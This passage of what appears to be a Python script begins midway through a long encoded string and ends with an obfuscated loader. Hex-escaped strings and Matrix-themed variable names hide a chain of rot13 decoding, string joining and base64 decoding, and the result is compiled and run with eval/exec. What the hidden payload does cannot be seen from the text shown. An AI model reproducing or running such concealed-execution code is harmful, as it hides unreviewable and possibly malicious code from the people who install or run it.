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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
